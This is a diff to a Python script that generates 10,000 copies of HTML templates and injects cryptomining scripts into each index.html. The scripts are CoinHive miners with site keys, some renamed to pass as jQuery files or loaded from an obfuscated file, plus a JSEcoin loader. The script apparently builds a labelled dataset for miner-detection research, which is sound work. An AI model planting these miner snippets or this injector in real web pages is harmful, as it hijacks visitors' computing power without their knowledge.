@@ -4,15 +4,16 @@ from os import listdir, mkdir
 from distutils.dir_util import copy_tree
 from shutil import rmtree, copyfile
 from re import split
-from random import random
+from random import random, choice
+from string import lowercase
 
 randomInt = lambda x: int(random() * x)
-
-def inject_code(file, content):
+randomStr = lambda n: ''.join(choice(lowercase) for x in range(n))
+def inject_code(fname, content):
   if content[0] == '<' and content[-1] == '>':
     content = content[1:][:-1]
 
-  with open(x, 'rb') as f:
+  with open(fname, 'rb') as f:
     a = f.read()
 
   b = split('>\s+<', a)
@@ -20,8 +21,10 @@ def inject_code(file, content):
 
   c = '><'.join(b)
 
-  with open(x, 'wb') as f:
+  with open(fname, 'wb') as f:
     f.write(c)
+
+base_path = '.'
 
 # read seed
 a = None
@@ -30,37 +33,37 @@ with open('seed.txt', 'r') as f:
 a = loads(a)
 
 # read template list
-template = listdir('sample/template/')
-rmtree('sample/output/', ignore_errors=True)
-mkdir('sample/output/')
+template = listdir(base_path+'/template/')
+rmtree(base_path+'/output/', ignore_errors=True)
+mkdir(base_path+'/output/')
 
 keyword = ['windmill', 'rok', 'smartphone', 'listenrine', 'electronic', 'coffee', 'hyunki', 'saykim', 'suedragon']
 
 for i in range(10000):
   j ,k = a[i] / 0x10, a[i] % 0x10
-  src = 'sample/template/%s/' % (template[j])
-  dst = 'sample/output/%04d/' % (i)
+  src = base_path+'/template/%s/' % (template[j])
+  dst = base_path+'/output/%04d/' % (i)
   copy_tree(src, dst)
 
   if k == 0:
-    pass
+    x = '<!--' + randomStr(randomInt(100) + 1) + '-->'
   elif k == 1: # COINHIVE JehKQTdWK2WwDl8lOG8Pmx7F3w8K7Z0H
     x = '<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous("JehKQTdWK2WwDl8lOG8Pmx7F3w8K7Z0H", {throttle: 0.3}); if (!miner.isMobile() && !miner.didOptOut(14400)) { miner.start(); }</script>'
-    pass
   elif k == 2: # COINHIVE w4npHvGBkqousLtpNIel6Hekoy1DWc2i
-    copyfile('sample/coinhive.min.js', dst + 'coinhive.min.js')
+    copyfile(base_path+'/coinhive.min.js', dst + 'coinhive.min.js')
     x = '<script src="coinhive.min.js"></script><script>new CoinHive.Anonymous("w4npHvGBkqousLtpNIel6Hekoy1DWc2i").start();</script>'
-    pass
   elif k == 3: # COINHIVE 4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm
     k = keyword[randomInt(len(keyword))]
-    copyfile('sample/coinhive.min.js', dst + ('jquery-%s.min.js' % k))
+    copyfile(base_path+'/coinhive.min.js', dst + ('jquery-%s.min.js' % k))
     x = '<script src="jquery-%s.min.js"></script><script>(()=>new CoinHive.Anonymous("4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm").start())()</script>' % k
-    pass
   elif k == 4: # COINHIVE 4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm
-    copyfile('sample/coinhive.min.js', dst + 'jquery-windmill.min.js')
-    x = '<script src="jquery-windmill.min.js"></script><script>(()=>new CoinHive.Anonymous("4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm").start())()</script>'
-    pass
+    copyfile(base_path+'/obfuscated.js', dst + 'go.js')
+    x = '<script src="go.js"></script><script>(()=>new CoinHive.Anonymous("4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm").start())()</script>'
   elif k == 5: # JSECOIN
-    pass
+    x = '<script type="text/javascript">!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/70204/peter.pagez.kr/0/0/",s.parentNode.insertBefore(t,s)}();</script>'
   elif k == 6: # MYSITE
-    pass
+    copyfile(base_path+'/coinhive.min.js', dst + 'x.js')
+    x = "<script src=\"x.js\"></script><script>CoinHive.CONFIG.WEBSOCKET_SHARDS = [[\"wss://wsp02.pagez.kr/proxy\"]];(function(){new CoinHive.Anonymous('44ucPyp3J4j6FZ65yMsTeWjoFsZVCjWvneEgjHSBzd6d927CJELohAdJY4FqPsDU93VS8qZogomNojC18SoMUSnfBnq8RTB').start();})()</script>"
+
+  inject_code(dst + 'index.html', x)
+
